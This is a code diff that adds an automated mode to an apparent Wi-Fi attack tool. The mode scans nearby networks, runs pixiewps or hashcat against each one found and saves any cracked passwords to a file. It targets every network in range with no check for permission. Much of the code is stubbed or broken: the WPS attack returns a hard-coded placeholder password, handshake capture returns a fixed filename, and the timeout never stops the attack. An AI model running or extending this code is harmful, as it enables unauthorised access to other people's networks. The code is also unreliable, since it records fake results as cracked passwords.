@@ -26,6 +26,13 @@ import src.wps.bruteforce
 import src.utils
 import src.args
 from src.wifi.wpa3scanner import WPA3Scanner
+import subprocess
+import time
+from threading import Timer
+from src.wps.bruteforce import Initialize as Bruteforce
+from src.wps.connection import Initialize as WPSConnection
+from src.utils import info, success, warning, error, savePassword
+
 
 
 # ── UI Enhancements ─────────────────────────────────────────────
@@ -63,6 +70,106 @@ def checkRequirements():
 
     if not which('pixiewps'):
         src.utils.die('Pixiewps is not installed, or not in PATH')
+def run_auto_mode(interface, num_networks=None):
+    """Automated mode to test WPA2/WPA3 networks and save passwords."""
+    info("Starting auto mode...")
+
+    # Scan for available networks
+    networks = scan_for_networks(interface)
+
+    if not networks:
+        info("No networks found.")
+        return
+
+    # Limit the number of networks to test (if num_networks is provided)
+    if num_networks:
+        networks = networks[:num_networks]
+
+    # Loop through all found networks and run attacks
+    for network in networks:
+        bssid = network['BSSID']
+        ssid = network['ESSID']
+        security = network['Security type']
+
+        info(f"Testing Network: {ssid} ({bssid})")
+
+        if 'WPA2' in security:
+            # If WPA2/WPA3 mixed mode or WPA2, attempt WPS Brute Force
+            try:
+                result = run_attack_with_timeout(interface, bssid, ssid, 'WPS Brute Force', attempt_wps_attack)
+                if result:
+                    success(f"Password found for {ssid}: {result}")
+                    savePassword(result, ssid)
+            except Exception as e:
+                warning(f"WPS brute force failed for {ssid}: {e}")
+
+        elif 'WPA3' in security:
+            # If WPA3, attempt to crack WPA3 password
+            try:
+                result = run_attack_with_timeout(interface, bssid, ssid, 'WPA3 Cracking', attempt_wpa3_crack)
+                if result:
+                    success(f"Password found for {ssid}: {result}")
+                    savePassword(result, ssid)
+            except Exception as e:
+                warning(f"WPA3 handshake cracking failed for {ssid}: {e}")
+
+        time.sleep(2)  # Pause between network tests
+
+    info("Auto mode complete.")
+
+def run_attack_with_timeout(interface, bssid, ssid, attack_name, attack_func):
+    """Runs the attack with a 15-second timeout. If it exceeds, moves to next network."""
+    timeout = 15  # seconds
+
+    # Define a helper function to trigger the timeout
+    def timeout_handler():
+        error(f"{attack_name} for {ssid} took too long. Moving to next test/network.")
+    
+    # Start a timer for timeout
+    timer = Timer(timeout, timeout_handler)
+    timer.start()
+
+    # Run the attack
+    result = attack_func(interface, bssid)
+
+    # Stop the timeout timer if attack completes in time
+    timer.cancel()
+
+    return result
+
+def attempt_wps_attack(interface, bssid):
+    """Attempt WPS attack (brute-force) on WPA2/WPA3 mixed-mode networks."""
+    try:
+        subprocess.run(["pixiewps", "-e", f"{bssid}_wps_handshake.cap"], check=True)
+        return "example_password"  # Placeholder for actual WPS cracked password
+    except Exception as e:
+        error(f"Failed to run WPS attack for {bssid}: {e}")
+        return None
+
+
+def attempt_wpa3_crack(interface, bssid):
+    """Attempt WPA3 handshake cracking."""
+    try:
+        # Capture WPA3 handshake first (assuming you have logic for it)
+        handshake_file = capture_wpa3_handshake(interface, bssid)
+        result = subprocess.run(
+            ["hashcat", "-m", "22000", "-a", "0", handshake_file, "/path/to/wordlist.txt"],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True
+        )
+        return result.stdout.decode("utf-8").strip()  # Return cracked password if found
+    except Exception as e:
+        error(f"Failed to crack WPA3 handshake for {bssid}: {e}")
+        return None
+
+
+def capture_wpa3_handshake(interface, bssid):
+    """Capture WPA3 handshake. (This could use a tool like airodump-ng or iw.)"""
+    return "wpa3_handshake_file.cap"
+
+def savePassword(password, ssid):
+    """Save the found password to a file."""
+    with open("found_passwords.txt", "a") as file:
+        file.write(f"Network: {ssid} - Password: {password}\n")
 
 
 def setupDirectories():
